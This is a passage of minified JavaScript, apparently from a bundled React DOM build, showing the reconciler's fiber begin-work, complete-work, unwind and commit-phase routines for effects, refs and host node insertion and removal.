            if (g = (d & u.childLanes) !== 0,
            g || (wh(c, u, d, !1),
            g = (d & u.childLanes) !== 0),
            w) {
                if (g)
                    return VC(c, u, d);
                u.flags |= 128
            }
            if (w = u.memoizedState,
            w !== null && (w.rendering = null,
            w.tail = null,
            w.lastEffect = null),
            ae(pn, pn.current),
            g)
                break;
            return null;
        case 22:
        case 23:
            return u.lanes = 0,
            UC(c, u, d);
        case 24:
            Ya(u, hn, c.memoizedState.cache)
        }
        return la(c, u, d)
    }
    function HC(c, u, d) {
        if (c !== null)
            if (c.memoizedProps !== u.pendingProps)
                xn = !0;
            else {
                if (!Nw(c, d) && (u.flags & 128) === 0)
                    return xn = !1,
                    lL(c, u, d);
                xn = (c.flags & 131072) !== 0
            }
        else
            xn = !1,
            xr && (u.flags & 1048576) !== 0 && TP(u, eg, u.index);
        switch (u.lanes = 0,
        u.tag) {
        case 16:
            e: {
                c = u.pendingProps;
                var g = u.elementType
                  , w = g._init;
                if (g = w(g._payload),
                u.type = g,
                typeof g == "function")
                    qx(g) ? (c = yl(g, c),
                    u.tag = 1,
                    u = $C(null, u, g, c, d)) : (u.tag = 0,
                    u = Bw(null, u, g, c, d));
                else {
                    if (g != null) {
                        if (w = g.$$typeof,
                        w === F) {
                            u.tag = 11,
                            u = NC(null, u, g, c, d);
                            break e
                        } else if (w === M) {
                            u.tag = 14,
                            u = DC(null, u, g, c, d);
                            break e
                        }
                    }
                    throw u = V(g) || g,
                    Error(o(306, u, ""))
                }
            }
            return u;
        case 0:
            return Bw(c, u, u.type, u.pendingProps, d);
        case 1:
            return g = u.type,
            w = yl(g, u.pendingProps),
            $C(c, u, g, w, d);
        case 3:
            e: {
                if (Fe(u, u.stateNode.containerInfo),
                c === null)
                    throw Error(o(387));
                g = u.pendingProps;
                var A = u.memoizedState;
                w = A.element,
                ow(c, u),
                Sh(u, g, null, d);
                var q = u.memoizedState;
                if (g = q.cache,
                Ya(u, hn, g),
                g !== A.cache && Jx(u, [hn], d, !0),
                Ch(),
                g = q.element,
                A.isDehydrated)
                    if (A = {
                        element: g,
                        isDehydrated: !1,
                        cache: q.cache
                    },
                    u.updateQueue.baseState = A,
                    u.memoizedState = A,
                    u.flags & 256) {
                        u = zC(c, u, g, d);
                        break e
                    } else if (g !== w) {
                        w = pi(Error(o(424)), u),
                        xh(w),
                        u = zC(c, u, g, d);
                        break e
                    } else {
                        switch (c = u.stateNode.containerInfo,
                        c.nodeType) {
                        case 9:
                            c = c.body;
                            break;
                        default:
                            c = c.nodeName === "HTML" ? c.ownerDocument.body : c
                        }
                        for (Gr = Hi(c.firstChild),
                        io = u,
                        xr = !0,
                        ul = null,
                        xs = !0,
                        d = AC(u, null, g, d),
                        u.child = d; d; )
                            d.flags = d.flags & -3 | 4096,
                            d = d.sibling
                    }
                else {
                    if (mh(),
                    g === w) {
                        u = la(c, u, d);
                        break e
                    }
                    Wn(c, u, g, d)
                }
                u = u.child
            }
            return u;
        case 26:
            return wg(c, u),
            c === null ? (d = Y6(u.type, null, u.pendingProps, null)) ? u.memoizedState = d : xr || (d = u.type,
            c = u.pendingProps,
            g = Ng(Pe.current).createElement(d),
            g[Ne] = u,
            g[je] = c,
            Nn(g, d, c),
            Ge(g),
            u.stateNode = g) : u.memoizedState = Y6(u.type, c.memoizedProps, u.pendingProps, c.memoizedState),
            null;
        case 27:
            return rt(u),
            c === null && xr && (g = u.stateNode = G6(u.type, u.pendingProps, Pe.current),
            io = u,
            xs = !0,
            w = Gr,
            fc(u.type) ? (gv = w,
            Gr = Hi(g.firstChild)) : Gr = w),
            Wn(c, u, u.pendingProps.children, d),
            wg(c, u),
            c === null && (u.flags |= 4194304),
            u.child;
        case 5:
            return c === null && xr && ((w = g = Gr) && (g = FL(g, u.type, u.pendingProps, xs),
            g !== null ? (u.stateNode = g,
            io = u,
            Gr = Hi(g.firstChild),
            xs = !1,
            w = !0) : w = !1),
            w || fl(u)),
            rt(u),
            w = u.type,
            A = u.pendingProps,
            q = c !== null ? c.memoizedProps : null,
            g = A.children,
            fv(w, A) ? g = null : q !== null && fv(w, q) && (u.flags |= 32),
            u.memoizedState !== null && (w = uw(c, u, tL, null, null, d),
            Zh._currentValue = w),
            wg(c, u),
            Wn(c, u, g, d),
            u.child;
        case 6:
            return c === null && xr && ((c = d = Gr) && (d = UL(d, u.pendingProps, xs),
            d !== null ? (u.stateNode = d,
            io = u,
            Gr = null,
            c = !0) : c = !1),
            c || fl(u)),
            null;
        case 13:
            return jC(c, u, d);
        case 4:
            return Fe(u, u.stateNode.containerInfo),
            g = u.pendingProps,
            c === null ? u.child = Ju(u, null, g, d) : Wn(c, u, g, d),
            u.child;
        case 11:
            return NC(c, u, u.type, u.pendingProps, d);
        case 7:
            return Wn(c, u, u.pendingProps, d),
            u.child;
        case 8:
            return Wn(c, u, u.pendingProps.children, d),
            u.child;
        case 12:
            return Wn(c, u, u.pendingProps.children, d),
            u.child;
        case 10:
            return g = u.pendingProps,
            Ya(u, u.type, g.value),
            Wn(c, u, g.children, d),
            u.child;
        case 9:
            return w = u.type._context,
            g = u.pendingProps.children,
            hl(u),
            w = Gn(w),
            g = g(w),
            u.flags |= 1,
            Wn(c, u, g, d),
            u.child;
        case 14:
            return DC(c, u, u.type, u.pendingProps, d);
        case 15:
            return FC(c, u, u.type, u.pendingProps, d);
        case 19:
            return VC(c, u, d);
        case 31:
            return g = u.pendingProps,
            d = u.mode,
            g = {
                mode: g.mode,
                children: g.children
            },
            c === null ? (d = vg(g, d),
            d.ref = u.ref,
            u.child = d,
            d.return = u,
            u = d) : (d = ra(c.child, g),
            d.ref = u.ref,
            u.child = d,
            d.return = u,
            u = d),
            u;
        case 22:
            return UC(c, u, d);
        case 24:
            return hl(u),
            g = Gn(hn),
            c === null ? (w = tw(),
            w === null && (w = Fr,
            A = Qx(),
            w.pooledCache = A,
            A.refCount++,
            A !== null && (w.pooledCacheLanes |= d),
            w = A),
            u.memoizedState = {
                parent: g,
                cache: w
            },
            nw(u),
            Ya(u, hn, w)) : ((c.lanes & d) !== 0 && (ow(c, u),
            Sh(u, null, null, d),
            Ch()),
            w = c.memoizedState,
            A = u.memoizedState,
            w.parent !== g ? (w = {
                parent: g,
                cache: g
            },
            u.memoizedState = w,
            u.lanes === 0 && (u.memoizedState = u.updateQueue.baseState = w),
            Ya(u, hn, g)) : (g = A.cache,
            Ya(u, hn, g),
            g !== w.cache && Jx(u, [hn], d, !0))),
            Wn(c, u, u.pendingProps.children, d),
            u.child;
        case 29:
            throw u.pendingProps
        }
        throw Error(o(156, u.tag))
    }
    function ua(c) {
        c.flags |= 4
    }
    function GC(c, u) {
        if (u.type !== "stylesheet" || (u.state.loading & 4) !== 0)
            c.flags &= -16777217;
        else if (c.flags |= 16777216,
        !tS(u)) {
            if (u = mi.current,
            u !== null && ((lr & 4194048) === lr ? ws !== null : (lr & 62914560) !== lr && (lr & 536870912) === 0 || u !== ws))
                throw Ah = rw,
                IP;
            c.flags |= 8192
        }
    }
    function Tg(c, u) {
        u !== null && (c.flags |= 4),
        c.flags & 16384 && (u = c.tag !== 22 ? Ke() : 536870912,
        c.lanes |= u,
        rf |= u)
    }
    function Mh(c, u) {
        if (!xr)
            switch (c.tailMode) {
            case "hidden":
                u = c.tail;
                for (var d = null; u !== null; )
                    u.alternate !== null && (d = u),
                    u = u.sibling;
                d === null ? c.tail = null : d.sibling = null;
                break;
            case "collapsed":
                d = c.tail;
                for (var g = null; d !== null; )
                    d.alternate !== null && (g = d),
                    d = d.sibling;
                g === null ? u || c.tail === null ? c.tail = null : c.tail.sibling = null : g.sibling = null
            }
    }
    function qr(c) {
        var u = c.alternate !== null && c.alternate.child === c.child
          , d = 0
          , g = 0;
        if (u)
            for (var w = c.child; w !== null; )
                d |= w.lanes | w.childLanes,
                g |= w.subtreeFlags & 65011712,
                g |= w.flags & 65011712,
                w.return = c,
                w = w.sibling;
        else
            for (w = c.child; w !== null; )
                d |= w.lanes | w.childLanes,
                g |= w.subtreeFlags,
                g |= w.flags,
                w.return = c,
                w = w.sibling;
        return c.subtreeFlags |= g,
        c.childLanes = d,
        u
    }
    function uL(c, u, d) {
        var g = u.pendingProps;
        switch (Kx(u),
        u.tag) {
        case 31:
        case 16:
        case 15:
        case 0:
        case 11:
        case 7:
        case 8:
        case 12:
        case 9:
        case 14:
            return qr(u),
            null;
        case 1:
            return qr(u),
            null;
        case 3:
            return d = u.stateNode,
            g = null,
            c !== null && (g = c.memoizedState.cache),
            u.memoizedState.cache !== g && (u.flags |= 2048),
            sa(hn),
            Je(),
            d.pendingContext && (d.context = d.pendingContext,
            d.pendingContext = null),
            (c === null || c.child === null) && (bh(u) ? ua(u) : c === null || c.memoizedState.isDehydrated && (u.flags & 256) === 0 || (u.flags |= 1024,
            PP())),
            qr(u),
            null;
        case 26:
            return d = u.memoizedState,
            c === null ? (ua(u),
            d !== null ? (qr(u),
            GC(u, d)) : (qr(u),
            u.flags &= -16777217)) : d ? d !== c.memoizedState ? (ua(u),
            qr(u),
            GC(u, d)) : (qr(u),
            u.flags &= -16777217) : (c.memoizedProps !== g && ua(u),
            qr(u),
            u.flags &= -16777217),
            null;
        case 27:
            xt(u),
            d = Pe.current;
            var w = u.type;
            if (c !== null && u.stateNode != null)
                c.memoizedProps !== g && ua(u);
            else {
                if (!g) {
                    if (u.stateNode === null)
                        throw Error(o(166));
                    return qr(u),
                    null
                }
                c = he.current,
                bh(u) ? EP(u) : (c = G6(w, g, d),
                u.stateNode = c,
                ua(u))
            }
            return qr(u),
            null;
        case 5:
            if (xt(u),
            d = u.type,
            c !== null && u.stateNode != null)
                c.memoizedProps !== g && ua(u);
            else {
                if (!g) {
                    if (u.stateNode === null)
                        throw Error(o(166));
                    return qr(u),
                    null
                }
                if (c = he.current,
                bh(u))
                    EP(u);
                else {
                    switch (w = Ng(Pe.current),
                    c) {
                    case 1:
                        c = w.createElementNS("http://www.w3.org/2000/svg", d);
                        break;
                    case 2:
                        c = w.createElementNS("http://www.w3.org/1998/Math/MathML", d);
                        break;
                    default:
                        switch (d) {
                        case "svg":
                            c = w.createElementNS("http://www.w3.org/2000/svg", d);
                            break;
                        case "math":
                            c = w.createElementNS("http://www.w3.org/1998/Math/MathML", d);
                            break;
                        case "script":
                            c = w.createElement("div"),
                            c.innerHTML = "<script><\/script>",
                            c = c.removeChild(c.firstChild);
                            break;
                        case "select":
                            c = typeof g.is == "string" ? w.createElement("select", {
                                is: g.is
                            }) : w.createElement("select"),
                            g.multiple ? c.multiple = !0 : g.size && (c.size = g.size);
                            break;
                        default:
                            c = typeof g.is == "string" ? w.createElement(d, {
                                is: g.is
                            }) : w.createElement(d)
                        }
                    }
                    c[Ne] = u,
                    c[je] = g;
                    e: for (w = u.child; w !== null; ) {
                        if (w.tag === 5 || w.tag === 6)
                            c.appendChild(w.stateNode);
                        else if (w.tag !== 4 && w.tag !== 27 && w.child !== null) {
                            w.child.return = w,
                            w = w.child;
                            continue
                        }
                        if (w === u)
                            break e;
                        for (; w.sibling === null; ) {
                            if (w.return === null || w.return === u)
                                break e;
                            w = w.return
                        }
                        w.sibling.return = w.return,
                        w = w.sibling
                    }
                    u.stateNode = c;
                    e: switch (Nn(c, d, g),
                    d) {
                    case "button":
                    case "input":
                    case "select":
                    case "textarea":
                        c = !!g.autoFocus;
                        break e;
                    case "img":
                        c = !0;
                        break e;
                    default:
                        c = !1
                    }
                    c && ua(u)
                }
            }
            return qr(u),
            u.flags &= -16777217,
            null;
        case 6:
            if (c && u.stateNode != null)
                c.memoizedProps !== g && ua(u);
            else {
                if (typeof g != "string" && u.stateNode === null)
                    throw Error(o(166));
                if (c = Pe.current,
                bh(u)) {
                    if (c = u.stateNode,
                    d = u.memoizedProps,
                    g = null,
                    w = io,
                    w !== null)
                        switch (w.tag) {
                        case 27:
                        case 5:
                            g = w.memoizedProps
                        }
                    c[Ne] = u,
                    c = !!(c.nodeValue === d || g !== null && g.suppressHydrationWarning === !0 || L6(c.nodeValue, d)),
                    c || fl(u)
                } else
                    c = Ng(c).createTextNode(g),
                    c[Ne] = u,
                    u.stateNode = c
            }
            return qr(u),
            null;
        case 13:
            if (g = u.memoizedState,
            c === null || c.memoizedState !== null && c.memoizedState.dehydrated !== null) {
                if (w = bh(u),
                g !== null && g.dehydrated !== null) {
                    if (c === null) {
                        if (!w)
                            throw Error(o(318));
                        if (w = u.memoizedState,
                        w = w !== null ? w.dehydrated : null,
                        !w)
                            throw Error(o(317));
                        w[Ne] = u
                    } else
                        mh(),
                        (u.flags & 128) === 0 && (u.memoizedState = null),
                        u.flags |= 4;
                    qr(u),
                    w = !1
                } else
                    w = PP(),
                    c !== null && c.memoizedState !== null && (c.memoizedState.hydrationErrors = w),
                    w = !0;
                if (!w)
                    return u.flags & 256 ? (ca(u),
                    u) : (ca(u),
                    null)
            }
            if (ca(u),
            (u.flags & 128) !== 0)
                return u.lanes = d,
                u;
            if (d = g !== null,
            c = c !== null && c.memoizedState !== null,
            d) {
                g = u.child,
                w = null,
                g.alternate !== null && g.alternate.memoizedState !== null && g.alternate.memoizedState.cachePool !== null && (w = g.alternate.memoizedState.cachePool.pool);
                var A = null;
                g.memoizedState !== null && g.memoizedState.cachePool !== null && (A = g.memoizedState.cachePool.pool),
                A !== w && (g.flags |= 2048)
            }
            return d !== c && d && (u.child.flags |= 8192),
            Tg(u, u.updateQueue),
            qr(u),
            null;
        case 4:
            return Je(),
            c === null && sv(u.stateNode.containerInfo),
            qr(u),
            null;
        case 10:
            return sa(u.type),
            qr(u),
            null;
        case 19:
            if (ie(pn),
            w = u.memoizedState,
            w === null)
                return qr(u),
                null;
            if (g = (u.flags & 128) !== 0,
            A = w.rendering,
            A === null)
                if (g)
                    Mh(w, !1);
                else {
                    if (Kr !== 0 || c !== null && (c.flags & 128) !== 0)
                        for (c = u.child; c !== null; ) {
                            if (A = bg(c),
                            A !== null) {
                                for (u.flags |= 128,
                                Mh(w, !1),
                                c = A.updateQueue,
                                u.updateQueue = c,
                                Tg(u, c),
                                u.subtreeFlags = 0,
                                c = d,
                                d = u.child; d !== null; )
                                    vP(d, c),
                                    d = d.sibling;
                                return ae(pn, pn.current & 1 | 2),
                                u.child
                            }
                            c = c.sibling
                        }
                    w.tail !== null && Cr() > Pg && (u.flags |= 128,
                    g = !0,
                    Mh(w, !1),
                    u.lanes = 4194304)
                }
            else {
                if (!g)
                    if (c = bg(A),
                    c !== null) {
                        if (u.flags |= 128,
                        g = !0,
                        c = c.updateQueue,
                        u.updateQueue = c,
                        Tg(u, c),
                        Mh(w, !0),
                        w.tail === null && w.tailMode === "hidden" && !A.alternate && !xr)
                            return qr(u),
                            null
                    } else
                        2 * Cr() - w.renderingStartTime > Pg && d !== 536870912 && (u.flags |= 128,
                        g = !0,
                        Mh(w, !1),
                        u.lanes = 4194304);
                w.isBackwards ? (A.sibling = u.child,
                u.child = A) : (c = w.last,
                c !== null ? c.sibling = A : u.child = A,
                w.last = A)
            }
            return w.tail !== null ? (u = w.tail,
            w.rendering = u,
            w.tail = u.sibling,
            w.renderingStartTime = Cr(),
            u.sibling = null,
            c = pn.current,
            ae(pn, g ? c & 1 | 2 : c & 1),
            u) : (qr(u),
            null);
        case 22:
        case 23:
            return ca(u),
            cw(),
            g = u.memoizedState !== null,
            c !== null ? c.memoizedState !== null !== g && (u.flags |= 8192) : g && (u.flags |= 8192),
            g ? (d & 536870912) !== 0 && (u.flags & 128) === 0 && (qr(u),
            u.subtreeFlags & 6 && (u.flags |= 8192)) : qr(u),
            d = u.updateQueue,
            d !== null && Tg(u, d.retryQueue),
            d = null,
            c !== null && c.memoizedState !== null && c.memoizedState.cachePool !== null && (d = c.memoizedState.cachePool.pool),
            g = null,
            u.memoizedState !== null && u.memoizedState.cachePool !== null && (g = u.memoizedState.cachePool.pool),
            g !== d && (u.flags |= 2048),
            c !== null && ie(pl),
            null;
        case 24:
            return d = null,
            c !== null && (d = c.memoizedState.cache),
            u.memoizedState.cache !== d && (u.flags |= 2048),
            sa(hn),
            qr(u),
            null;
        case 25:
            return null;
        case 30:
            return null
        }
        throw Error(o(156, u.tag))
    }
    function fL(c, u) {
        switch (Kx(u),
        u.tag) {
        case 1:
            return c = u.flags,
            c & 65536 ? (u.flags = c & -65537 | 128,
            u) : null;
        case 3:
            return sa(hn),
            Je(),
            c = u.flags,
            (c & 65536) !== 0 && (c & 128) === 0 ? (u.flags = c & -65537 | 128,
            u) : null;
        case 26:
        case 27:
        case 5:
            return xt(u),
            null;
        case 13:
            if (ca(u),
            c = u.memoizedState,
            c !== null && c.dehydrated !== null) {
                if (u.alternate === null)
                    throw Error(o(340));
                mh()
            }
            return c = u.flags,
            c & 65536 ? (u.flags = c & -65537 | 128,
            u) : null;
        case 19:
            return ie(pn),
            null;
        case 4:
            return Je(),
            null;
        case 10:
            return sa(u.type),
            null;
        case 22:
        case 23:
            return ca(u),
            cw(),
            c !== null && ie(pl),
            c = u.flags,
            c & 65536 ? (u.flags = c & -65537 | 128,
            u) : null;
        case 24:
            return sa(hn),
            null;
        case 25:
            return null;
        default:
            return null
        }
    }
    function KC(c, u) {
        switch (Kx(u),
        u.tag) {
        case 3:
            sa(hn),
            Je();
            break;
        case 26:
        case 27:
        case 5:
            xt(u);
            break;
        case 4:
            Je();
            break;
        case 13:
            ca(u);
            break;
        case 19:
            ie(pn);
            break;
        case 10:
            sa(u.type);
            break;
        case 22:
        case 23:
            ca(u),
            cw(),
            c !== null && ie(pl);
            break;
        case 24:
            sa(hn)
        }
    }
    function Nh(c, u) {
        try {
            var d = u.updateQueue
              , g = d !== null ? d.lastEffect : null;
            if (g !== null) {
                var w = g.next;
                d = w;
                do {
                    if ((d.tag & c) === c) {
                        g = void 0;
                        var A = d.create
                          , q = d.inst;
                        g = A(),
                        q.destroy = g
                    }
                    d = d.next
                } while (d !== w)
            }
        } catch (Q) {
            Or(u, u.return, Q)
        }
    }
    function nc(c, u, d) {
        try {
            var g = u.updateQueue
              , w = g !== null ? g.lastEffect : null;
            if (w !== null) {
                var A = w.next;
                g = A;
                do {
                    if ((g.tag & c) === c) {
                        var q = g.inst
                          , Q = q.destroy;
                        if (Q !== void 0) {
                            q.destroy = void 0,
                            w = u;
                            var ce = d
                              , ve = Q;
                            try {
                                ve()
                            } catch (We) {
                                Or(w, ce, We)
                            }
                        }
                    }
                    g = g.next
                } while (g !== A)
            }
        } catch (We) {
            Or(u, u.return, We)
        }
    }
    function ZC(c) {
        var u = c.updateQueue;
        if (u !== null) {
            var d = c.stateNode;
            try {
                DP(u, d)
            } catch (g) {
                Or(c, c.return, g)
            }
        }
    }
    function YC(c, u, d) {
        d.props = yl(c.type, c.memoizedProps),
        d.state = c.memoizedState;
        try {
            d.componentWillUnmount()
        } catch (g) {
            Or(c, u, g)
        }
    }
    function Dh(c, u) {
        try {
            var d = c.ref;
            if (d !== null) {
                switch (c.tag) {
                case 26:
                case 27:
                case 5:
                    var g = c.stateNode;
                    break;
                case 30:
                    g = c.stateNode;
                    break;
                default:
                    g = c.stateNode
                }
                typeof d == "function" ? c.refCleanup = d(g) : d.current = g
            }
        } catch (w) {
            Or(c, u, w)
        }
    }
    function vs(c, u) {
        var d = c.ref
          , g = c.refCleanup;
        if (d !== null)
            if (typeof g == "function")
                try {
                    g()
                } catch (w) {
                    Or(c, u, w)
                } finally {
                    c.refCleanup = null,
                    c = c.alternate,
                    c != null && (c.refCleanup = null)
                }
            else if (typeof d == "function")
                try {
                    d(null)
                } catch (w) {
                    Or(c, u, w)
                }
            else
                d.current = null
    }
    function XC(c) {
        var u = c.type
          , d = c.memoizedProps
          , g = c.stateNode;
        try {
            e: switch (u) {
            case "button":
            case "input":
            case "select":
            case "textarea":
                d.autoFocus && g.focus();
                break e;
            case "img":
                d.src ? g.src = d.src : d.srcSet && (g.srcset = d.srcSet)
            }
        } catch (w) {
            Or(c, c.return, w)
        }
    }
    function Dw(c, u, d) {
        try {
            var g = c.stateNode;
            RL(g, c.type, d, u),
            g[je] = u
        } catch (w) {
            Or(c, c.return, w)
        }
    }
    function JC(c) {
        return c.tag === 5 || c.tag === 3 || c.tag === 26 || c.tag === 27 && fc(c.type) || c.tag === 4
    }
    function Fw(c) {
        e: for (; ; ) {
            for (; c.sibling === null; ) {
                if (c.return === null || JC(c.return))
                    return null;
                c = c.return
            }
            for (c.sibling.return = c.return,
            c = c.sibling; c.tag !== 5 && c.tag !== 6 && c.tag !== 18; ) {
                if (c.tag === 27 && fc(c.type) || c.flags & 2 || c.child === null || c.tag === 4)
                    continue e;
                c.child.return = c,
                c = c.child
            }
            if (!(c.flags & 2))
                return c.stateNode
        }
    }
    function Uw(c, u, d) {
        var g = c.tag;
        if (g === 5 || g === 6)
            c = c.stateNode,
            u ? (d.nodeType === 9 ? d.body : d.nodeName === "HTML" ? d.ownerDocument.body : d).insertBefore(c, u) : (u = d.nodeType === 9 ? d.body : d.nodeName === "HTML" ? d.ownerDocument.body : d,
            u.appendChild(c),
            d = d._reactRootContainer,
            d != null || u.onclick !== null || (u.onclick = Mg));
        else if (g !== 4 && (g === 27 && fc(c.type) && (d = c.stateNode,
        u = null),
        c = c.child,
        c !== null))
            for (Uw(c, u, d),
            c = c.sibling; c !== null; )
                Uw(c, u, d),
                c = c.sibling
    }
    function Eg(c, u, d) {
        var g = c.tag;
        if (g === 5 || g === 6)
            c = c.stateNode,
            u ? d.insertBefore(c, u) : d.appendChild(c);
        else if (g !== 4 && (g === 27 && fc(c.type) && (d = c.stateNode),
        c = c.child,
        c !== null))
            for (Eg(c, u, d),
            c = c.sibling; c !== null; )
                Eg(c, u, d),
                c = c.sibling
    }
    function QC(c) {
        var u = c.stateNode
          , d = c.memoizedProps;
        try {
            for (var g = c.type, w = u.attributes; w.length; )
                u.removeAttributeNode(w[0]);
            Nn(u, g, d),
            u[Ne] = c,
            u[je] = d
        } catch (A) {
            Or(c, c.return, A)
        }
    }
    var fa = !1
      , Yr = !1
      , kw = !1
      , e6 = typeof WeakSet == "function" ? WeakSet : Set
      , wn = null;
    function dL(c, u) {
        if (c = c.containerInfo,
        lv = $g,
        c = fP(c),
        Fx(c)) {
            if ("selectionStart"in c)
                var d = {
                    start: c.selectionStart,
                    end: c.selectionEnd
                };
            else
                e: {
                    d = (d = c.ownerDocument) && d.defaultView || window;
                    var g = d.getSelection && d.getSelection();
                    if (g && g.rangeCount !== 0) {
                        d = g.anchorNode;
                        var w = g.anchorOffset
                          , A = g.focusNode;
                        g = g.focusOffset;
                        try {
                            d.nodeType,
                            A.nodeType
                        } catch {
                            d = null;
                            break e
                        }
                        var q = 0
                          , Q = -1
                          , ce = -1
                          , ve = 0
                          , We = 0
                          , ke = c
                          , Se = null;
                        t: for (; ; ) {
                            for (var Be; ke !== d || w !== 0 && ke.nodeType !== 3 || (Q = q + w),
                            ke !== A || g !== 0 && ke.nodeType !== 3 || (ce = q + g),
                            ke.nodeType === 3 && (q += ke.nodeValue.length),
                            (Be = ke.firstChild) !== null; )
                                Se = ke,
                                ke = Be;
                            for (; ; ) {
                                if (ke === c)
                                    break t;
                                if (Se === d && ++ve === w && (Q = q),
                                Se === A && ++We === g && (ce = q),
                                (Be = ke.nextSibling) !== null)
                                    break;
                                ke = Se,
                                Se = ke.parentNode
                            }
                            ke = Be
                        }
                        d = Q === -1 || ce === -1 ? null : {
                            start: Q,
                            end: ce
                        }
                    } else
                        d = null
                }
            d = d || {
                start: 0,
                end: 0
            }
        } else
            d = null;
        for (uv = {
            focusedElem: c,
            selectionRange: d
        },
        $g = !1,
        wn = u; wn !== null; )
            if (u = wn,
            c = u.child,
            (u.subtreeFlags & 1024) !== 0 && c !== null)
                c.return = u,
                wn = c;
            else
                for (; wn !== null; ) {
                    switch (u = wn,
                    A = u.alternate,
                    c = u.flags,
                    u.tag) {
                    case 0:
                        break;
                    case 11:
                    case 15:
                        break;
                    case 1:
                        if ((c & 1024) !== 0 && A !== null) {
                            c = void 0,
                            d = u,
                            w = A.memoizedProps,
                            A = A.memoizedState,
                            g = d.stateNode;
                            try {
                                var Ot = yl(d.type, w, d.elementType === d.type);
                                c = g.getSnapshotBeforeUpdate(Ot, A),
                                g.__reactInternalSnapshotBeforeUpdate = c
                            } catch (_t) {
                                Or(d, d.return, _t)
                            }
                        }
                        break;
                    case 3:
                        if ((c & 1024) !== 0) {
                            if (c = u.stateNode.containerInfo,
                            d = c.nodeType,
                            d === 9)
                                hv(c);
                            else if (d === 1)
                                switch (c.nodeName) {
                                case "HEAD":
                                case "HTML":
                                case "BODY":
                                    hv(c);
                                    break;
                                default:
                                    c.textContent = ""
                                }
                        }
                        break;
                    case 5:
                    case 26:
                    case 27:
                    case 6:
                    case 4:
                    case 17:
                        break;
                    default:
                        if ((c & 1024) !== 0)
                            throw Error(o(163))
                    }
                    if (c = u.sibling,
                    c !== null) {
                        c.return = u.return,
                        wn = c;
                        break
                    }
                    wn = u.return
                }
    }
    function t6(c, u, d) {
        var g = d.flags;
        switch (d.tag) {
        case 0:
        case 11:
        case 15:
            oc(c, d),
            g & 4 && Nh(5, d);
            break;
        case 1:
            if (oc(c, d),
            g & 4)
                if (c = d.stateNode,
                u === null)
                    try {
                        c.componentDidMount()
                    } catch (q) {
                        Or(d, d.return, q)
                    }
                else {
                    var w = yl(d.type, u.memoizedProps);
                    u = u.memoizedState;
                    try {
                        c.componentDidUpdate(w, u, c.__reactInternalSnapshotBeforeUpdate)
                    } catch (q) {
                        Or(d, d.return, q)
                    }
                }
            g & 64 && ZC(d),
            g & 512 && Dh(d, d.return);
            break;
        case 3:
            if (oc(c, d),
            g & 64 && (c = d.updateQueue,
            c !== null)) {
                if (u = null,
                d.child !== null)
                    switch (d.child.tag) {
                    case 27:
                    case 5:
                        u = d.child.stateNode;
                        break;
                    case 1:
                        u = d.child.stateNode
                    }
                try {
                    DP(c, u)
                } catch (q) {
                    Or(d, d.return, q)
                }
            }
            break;
        case 27:
            u === null && g & 4 && QC(d);
        case 26:
        case 5:
            oc(c, d),
            u === null && g & 4 && XC(d),
            g & 512 && Dh(d, d.return);
            break;
        case 12:
            oc(c, d);
            break;
        case 13:
            oc(c, d),
            g & 4 && o6(c, d),
            g & 64 && (c = d.memoizedState,
            c !== null && (c = c.dehydrated,
            c !== null && (d = vL.bind(null, d),
            kL(c, d))));
            break;
        case 22:
            if (g = d.memoizedState !== null || fa,
            !g) {
                u = u !== null && u.memoizedState !== null || Yr,
                w = fa;
                var A = Yr;
                fa = g,
                (Yr = u) && !A ? ic(c, d, (d.subtreeFlags & 8772) !== 0) : oc(c, d),
                fa = w,
                Yr = A
            }
            break;
        case 30:
            break;
        default:
            oc(c, d)
        }
    }
    function r6(c) {
        var u = c.alternate;
        u !== null && (c.alternate = null,
        r6(u)),
        c.child = null,
        c.deletions = null,
        c.sibling = null,
        c.tag === 5 && (u = c.stateNode,
        u !== null && lt(u)),
        c.stateNode = null,
        c.return = null,
        c.dependencies = null,
        c.memoizedProps = null,
        c.memoizedState = null,
        c.pendingProps = null,
        c.stateNode = null,
        c.updateQueue = null
    }
    var zr = null
      , Ao = !1;
    function da(c, u, d) {
        for (d = d.child; d !== null; )
            n6(c, u, d),
            d = d.sibling
    }
    function n6(c, u, d) {
        if (Z && typeof Z.onCommitFiberUnmount == "function")
            try {
                Z.onCommitFiberUnmount(vt, d)
            } catch {}
        switch (d.tag) {
        case 26:
            Yr || vs(d, u),
            da(c, u, d),
            d.memoizedState ? d.memoizedState.count-- : d.stateNode && (d = d.stateNode,
            d.parentNode.removeChild(d));
            break;
        case 27:
            Yr || vs(d, u);
            var g = zr
              , w = Ao;
            fc(d.type) && (zr = d.stateNode,
            Ao = !1),
            da(c, u, d),
            Vh(d.stateNode),
            zr = g,
            Ao = w;
            break;
        case 5:
            Yr || vs(d, u);
        case 6:
            if (g = zr,
            w = Ao,
            zr = null,
            da(c, u, d),
            zr = g,
            Ao = w,
            zr !== null)
                if (Ao)
                    try {
                        (zr.nodeType === 9 ? zr.body : zr.nodeName === "HTML" ? zr.ownerDocument.body : zr).removeChild(d.stateNode)
                    } catch (A) {
                        Or(d, u, A)
                    }
                else
                    try {
                        zr.removeChild(d.stateNode)
                    } catch (A) {
                        Or(d, u, A)
                    }
            break;
        case 18:
            zr !== null && (Ao ? (c = zr,
            V6(c.nodeType === 9 ? c.body : c.nodeName === "HTML" ? c.ownerDocument.body : c, d.stateNode),
            Qh(c)) : V6(zr, d.stateNode));
            break;
        case 4:
            g = zr,
            w = Ao,
            zr = d.stateNode.containerInfo,
            Ao = !0,
            da(c, u, d),
            zr = g,
            Ao = w;
            break;
        case 0:
        case 11:
        case 14:
        case 15:
            Yr || nc(2, d, u),
            Yr || nc(4, d, u),
            da(c, u, d);
            break;
        case 1:
            Yr || (vs(d, u),
            g = d.stateNode,
            typeof g.componentWillUnmount == "function" && YC(d, u, g)),
            da(c, u, d);
            break;
        case 21:
            da(c, u, d);
            break;
        case 22:
            Yr = (g = Yr) || d.memoizedState !== null,
            da(c, u, d),
            Yr = g;
            break;
        default:
            da(c, u, d)
        }
    }
    function o6(c, u) {
        if (u.memoizedState === null && (c = u.alternate,
        c !== null && (c = c.memoizedState,
        c !== null && (c = c.dehydrated,
        c !== null))))
            try {
                Qh(c)
            } catch (d) {
                Or(u, u.return, d)
            }
    }
    function hL(c) {
        switch (c.tag) {
        case 13:
        case 19:
            var u = c.stateNode;
            return u === null && (u = c.stateNode = new e6),
            u;
        case 22:
            return c = c.stateNode,
            u = c._retryCache,
            u === null && (u = c._retryCache = new e6),
            u;
        default:
            throw Error(o(435, c.tag))
        }
    }
    function Lw(c, u) {
        var d = hL(c);
        u.forEach(function(g) {
            var w = TL.bind(null, c, g);
